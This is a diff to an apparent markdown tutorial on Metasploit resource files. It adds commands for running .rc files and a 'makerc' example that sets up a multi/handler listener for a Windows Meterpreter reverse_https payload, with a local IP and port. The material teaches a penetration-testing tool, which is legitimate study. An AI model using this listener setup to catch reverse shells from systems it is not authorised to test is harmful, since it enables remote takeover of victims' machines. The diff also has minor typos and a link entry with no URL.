@@ -20,6 +20,7 @@
 ## EXTERNAL LINKS
 
 - [Rapid7 resource files](https://metasploit.help.rapid7.com/docs/resource-scripts)
+- [Rapid7 resource]
 
 ---
 
@@ -27,14 +28,27 @@
 
 ## RESOURCE FILES EXAMPLES
 
+- **Runing resource files**
+
+      msfconsole -r version.rc
+      msfconsole -r /root/version.rc
+      meterpreter > resource /root/version.rc
+
 - **The following example creates a resource file to display the version number of metasploit.**
 
       touch version.rc
       echo 'version' >> version.rc
 
-      run  :  msfconsole -r version.rc
-      or    :  msfconsole -r /root/version.rc
-      or    :  msf > resource /root/version.rc
+- **Use the core command 'makerc' to build your resource file**<br />
+'maekerc will build a resource file with the settings enter in msfconsole'
+
+      kali > msfconsole
+      msf > use exploit/multi/handler
+      msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
+      msf exploit(multi/handler) > set LHOST 192.168.1.71
+      msf exploit(multi/handler) > set LPORT 666
+
+      msf exploit(multi/handler) > makerc my_handler.rc
 
 <br />
 
